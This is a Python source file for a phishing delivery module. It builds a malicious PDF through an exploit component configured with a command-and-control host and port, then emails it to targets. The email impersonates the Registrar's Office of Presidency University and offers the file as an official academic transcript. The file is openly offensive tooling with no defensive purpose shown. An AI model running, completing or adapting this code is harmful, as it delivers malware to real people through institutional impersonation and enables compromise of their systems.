import os
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from exploitation.pdf_exploiter import PDFExploiter
from core.config_manager import ConfigManager
from core.database_manager import DatabaseManager

class PDFDeployer:
    def __init__(self, db_manager, config_path="config.json"):
        self.config = ConfigManager(config_path)
        self.db_manager = db_manager
        self.exploiter = PDFExploiter(self.config, self.db_manager)
        self.logger = logging.getLogger(__name__)
        self.running = False
        
    def start(self):
        """Start the PDF deployer service"""
        self.logger.info("PDFDeployer service started")
        self.running = True
        
        # Initialize email settings from config
        self.sender_email = self.config.get('email.sender', "registrar@presidencyuniversity.in")
        self.sender_password = self.config.get('email.password', "your_email_password")
        self.smtp_server = self.config.get('email.smtp_server', "smtp.gmail.com")
        self.smtp_port = self.config.get('email.smtp_port', 587)
        
        # Validate email configuration
        if not all([self.sender_email, self.sender_password, self.smtp_server, self.smtp_port]):
            self.logger.warning("Email configuration incomplete. PDF deployment may not work properly.")
    
    def stop(self):
        """Stop the PDF deployer service"""
        self.logger.info("PDFDeployer service stopped")
        self.running = False
    
    def create_and_send_pdf(self, target_email, template_type="university_transcript", subject=None, target_name=None):
        """Create and send a malicious PDF to target"""
        if not self.running:
            self.logger.error("PDFDeployer is not running. Cannot create and send PDF.")
            return None
            
        try:
            # Generate the malicious PDF
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.port', 5000)
            
            # Prepare custom data for the PDF
            custom_data = {}
            if target_name:
                custom_data["student_name"] = target_name
            
            pdf_path = self.exploiter.generate_malicious_pdf(
                template_type=template_type,
                c2_host=c2_host,
                c2_port=c2_port,
                custom_data=custom_data
            )
            
            # Send email with PDF attachment
            if not subject:
                if target_name:
                    subject = f"Presidency University - Academic Transcript for {target_name}"
                else:
                    subject = f"Presidency University - Academic Transcript"
            
            self._send_email(target_email, pdf_path, subject, target_name)
            
            return pdf_path
            
        except Exception as e:
            self.logger.error(f"Failed to create and send PDF: {str(e)}")
            return None
    
    def _send_email(self, target_email, attachment_path, subject, target_name):
        """Send email with PDF attachment"""
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = target_email
            msg['Subject'] = subject
            
            # Add body text
            if target_name:
                body = f"""
                Dear {target_name},
                
                Please find attached your official academic transcript from Presidency University.
                
                This document contains your complete academic record and can be used for verification purposes.
                If you have any questions or require additional copies, please contact the Registrar's Office.
                
                Best regards,
                Registrar's Office
                Presidency University
                Email: registrar@presidencyuniversity.in
                Phone: +91-80-12345678
                """
            else:
                body = f"""
                Dear User,
                
                Please find attached your official academic transcript from Presidency University.
                
                This document contains your complete academic record and can be used for verification purposes.
                If you have any questions or require additional copies, please contact the Registrar's Office.
                
                Best regards,
                Registrar's Office
                Presidency University
                Email: registrar@presidencyuniversity.in
                Phone: +91-80-12345678
                """
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach PDF
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename= {os.path.basename(attachment_path)}'
            )
            
            msg.attach(part)
            
            # Send email
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            text = msg.as_string()
            server.sendmail(self.sender_email, target_email, text)
            server.quit()
            
            self.logger.info(f"Malicious PDF sent to {target_email}")
            
        except Exception as e:
            self.logger.error(f"Failed to send email to {target_email}: {str(e)}")
            raise
